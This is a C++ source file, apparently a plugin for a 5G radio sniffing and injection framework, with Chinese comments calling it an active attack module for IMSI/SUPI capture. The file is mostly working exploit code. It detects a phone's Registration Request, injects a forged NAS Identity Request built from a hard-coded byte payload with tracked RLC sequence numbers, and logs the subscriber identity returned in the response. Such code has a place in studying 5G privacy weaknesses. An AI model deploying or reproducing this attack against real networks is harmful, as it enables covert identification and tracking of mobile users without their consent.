/**
 * @file identity_request.cc
 * @brief 主动攻击模块 —— 5G NAS Identity Request 注入 (IMSI/SUPI 捕获)
 *
 * 攻击原理：
 *   当嗅探到 UE 发送 Registration Request (0x41) 时，伪造一个 Identity Request
 *   消息注入到下行链路，要求 UE 回复其真实身份信息 (如 IMSI/SUPI)。
 *
 * 5G 协议背景：
 *   - Identity Request 是核心网 AMF 发给 UE 的 NAS MM 消息
 *   - UE 收到后会回复 Identity Response (0x5c)，其中可能包含 SUCI/SUPI
 *   - 本模块同时监听 Identity Response，从中提取 MSIN 并记录
 *   - 在 5G 中，UE 通常使用 SUCI (加密的 SUPI) 来保护隐私，
 *     但 Identity Request 可以请求明文身份
 *
 * 攻击流程：
 *   1. UE -> Registration Request  -> 触发注入 Identity Request
 *   2. UE -> Identity Response     -> 提取并记录 MSIN
 */

#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

/**
 * 预构造的 Identity Request 消息 (MAC-NR 层)
 *
 * 结构：
 *   [0..4]    RLC AM 控制 PDU (STATUS PDU)
 *   [5..end]  RLC AM 数据 PDU -> PDCP -> NAS Identity Request
 *
 * 运行时动态修改：
 *   [3]  = dl_ack_sn  (ACK SN)
 *   [8]  = dl_sn      (数据 PDU SN)
 *   [10] = dl_sn      (冗余 SN)
 */
const uint8_t identity_request_raw[] = {0x01, 0x03, 0x00, 0x01,
                                        0x00, // ACK SN = 1
                                        0x01, 0x0f, 0xc0, 0x00, 0x00, 0x00, 0x28, 0x80, 0x8f, 0xc0,
                                        0x0b, 0x60, 0x20, 0x00, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x00};

class IdentityRequestExploit : public Exploit
{
public:
  IdentityRequestExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                         SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    identity_request.reset(
        new std::vector<uint8_t>(identity_request_raw, identity_request_raw + sizeof(identity_request_raw)));
  }

  void setup() override
  {
    f_registration_request = wd_filter("nas_5gs.mm.message_type == 0x41"); // Registration Request
    f_identity_response    = wd_filter("nas_5gs.mm.message_type == 0x5c"); // Identity Response
    f_msin                 = wd_field("nas_5gs.mm.suci.msin");              // MSIN 字段
    f_rrc_setup_request    = wd_filter("nr-rrc.c1 == 0");                  // RRC Setup Request
    f_ack_sn               = wd_field("rlc-nr.am.ack-sn");
    f_sn                   = wd_field("rlc-nr.am.sn");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_registration_request);
    wd_register_filter(wd, f_identity_response);
    wd_register_filter(wd, f_rrc_setup_request);
    wd_register_field(wd, f_msin);
    wd_register_field(wd, f_ack_sn);
    wd_register_field(wd, f_sn);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    // 检查是否收到 Identity Response —— 提取其中的 MSIN (用户身份)
    if (wd_read_filter(wd, f_identity_response)) {
      wd_field_info_t identity_info = wd_read_field(wd, f_msin);
      if (identity_info) {
        const char* identity = packet_read_field_string(identity_info);
        logger.info(RED "Identity: %s" RESET, identity);
      }
    }

    if (direction == UL) {
      // --- RLC 序列号跟踪 ---

      wd_field_info_t ack_sn_info = wd_read_field(wd, f_ack_sn);
      if (ack_sn_info) {
        uint32_t ack_sn_recv = packet_read_field_uint32(ack_sn_info);
        logger.info("Received ACK SN: %u", ack_sn_recv);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
        }
      }

      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        uint32_t sn_recv = packet_read_field_uint32(sn_info);
        logger.info("Received msg with SN: %u", sn_recv);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv;
        }
      }

      // RRC Setup Request -> 新连接，重置序列号
      if (wd_read_filter(wd, f_rrc_setup_request)) {
        dl_sn     = 0;
        dl_ack_sn = 1;
      }
    }

    // 检测到 Registration Request -> 注入 Identity Request
    if (wd_read_filter(wd, f_registration_request)) {
      send_identity_request();
      logger.info("Sent identity request");
    }
  }

private:
  /** @brief 更新序列号后将 Identity Request 推入下行队列 */
  void send_identity_request()
  {
    identity_request->data()[3]  = dl_ack_sn & 0xff;
    identity_request->data()[8]  = dl_sn & 0xff;
    identity_request->data()[10] = dl_sn & 0xff;
    dl_buffer_queue.push(identity_request);
  }

  wd_filter_t f_registration_request;
  wd_filter_t f_rrc_setup_request;
  wd_filter_t f_identity_response;
  wd_field_t  f_msin;
  wd_field_t  f_ack_sn;
  wd_field_t  f_sn;

  uint32_t dl_sn     = 0;  ///< 当前下行发送 SN
  uint32_t dl_ack_sn = 1;  ///< 当前下行 ACK SN

  std::shared_ptr<std::vector<uint8_t> > identity_request; ///< 待注入的 Identity Request 载荷
};

/* 模块工厂函数 */
extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new IdentityRequestExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}
